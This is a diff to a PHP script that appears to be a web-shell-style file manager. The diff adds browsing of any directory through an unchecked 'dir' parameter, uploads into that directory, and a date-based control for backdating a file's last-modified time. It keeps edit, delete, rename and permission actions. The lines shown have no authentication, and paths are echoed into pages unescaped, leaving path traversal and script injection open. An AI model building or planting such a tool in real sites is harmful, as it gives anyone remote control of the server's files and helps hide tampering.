@@ -77,25 +77,36 @@
         }
         return $bytes;
     }
-    function listFiles() {
-        $files = scandir('.');
+    function listFiles($directory) {
+        $files = scandir($directory);
         echo "<ul>";
         foreach ($files as $file) {
-            if ($file != "." && $file != "..") {
-                $lastModified = date("Y-m-d H:i:s", filemtime($file));
-                echo "<li><a href='$file'>$file</a> (" . formatSizeUnits(filesize($file)) . ") : $lastModified - ";
-                echo "<a href='?action=edit&file=$file'>Edit</a> | ";
-                echo "<a href='?action=delete&file=$file'>Delete</a> | ";
-                echo "<a href='?action=rename&file=$file'>Rename</a> | ";
-                echo "<a href='?action=permissions&file=$file'>Change Permissions</a> | ";
-                echo "<a href='?action=changeLastModified&file=$file'>Modified</a></li>";
+            $fullPath = $directory . '/' . $file;
+            if (is_dir($fullPath)) {
+                if ($file != "." && $file != "..") {
+                    echo "<li><a href='?dir=$fullPath'>$file</a> (Directory)</li>";
+                }
+            } else {
+                if ($file != "." && $file != "..") {
+                    $lastModified = date("Y-m-d H:i:s", filemtime($fullPath));
+                    echo "<li><a href='?file=$fullPath'>$file</a> (" . formatSizeUnits(filesize($fullPath)) . ") : $lastModified - ";
+                    echo "<a href='?action=edit&file=$fullPath'>Edit</a> | ";
+                    echo "<a href='?action=delete&file=$fullPath'>Delete</a> | ";
+                    echo "<a href='?action=rename&file=$fullPath'>Rename</a> | ";
+                    echo "<a href='?action=permissions&file=$fullPath'>Change Permissions</a> | ";
+                    echo "<a href='?action=changeLastModified&file=$fullPath'>Modified</a></li>";
+                }
             }
         }
         echo "</ul>";
     }
 
+    $currentDirectory = isset($_GET['dir']) ? $_GET['dir'] : '.';
+    echo "<h2>Files in the current directory: $currentDirectory</h2>";
+    listFiles($currentDirectory);
+
     if(isset($_POST["submit"])) {
-        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], './' . basename($_FILES["fileToUpload"]["name"]))) {
+        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]))) {
             echo "The file ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " has been uploaded.";
         } else {
             echo "Sorry, there was an error uploading your file.";
@@ -173,29 +184,27 @@
             }
         } elseif($action == "changeLastModified") {
             if(file_exists($file)) {
-                echo "<h2>modified time for file: $file</h2>";
+                echo "<h2>Change last modified time for file: $file</h2>";
                 echo "<form action='?action=saveLastModified&file=$file' method='post'>";
-                echo "New Last Modified Time: <input type='text' name='newLastModified'><br>";
-                echo "<input type='submit' value='Modified Time'>";
+                echo "New Last Modified Time: <input type='text' name='newLastModified' placeholder='YYYY-MM-DD HH:MM:SS'><br>";
+                echo "<input type='submit' value='Change Last Modified Time'>";
                 echo "</form>";
             } else {
                 echo "File not found.";
             }
         } elseif($action == "saveLastModified") {
-            $newLastModified = $_POST['newLastModified'];
-            if(is_numeric($newLastModified)) {
+            $newLastModified = strtotime($_POST['newLastModified']);
+            if($newLastModified !== false) {
                 if(touch($file, $newLastModified)) {
                     echo "Last modified time changed successfully.";
                 } else {
                     echo "Error changing last modified time.";
                 }
             } else {
-                echo "Invalid timestamp format. Please provide a valid Unix timestamp.";
+                echo "Invalid timestamp format. Please provide a valid date/time (YYYY-MM-DD HH:MM:SS).";
             }
         }
     }
-    echo "<h2>Files in the current directory:</h2>";
-    listFiles();
 
     function deleteDirectory($dir) {
         if (is_dir($dir)) {
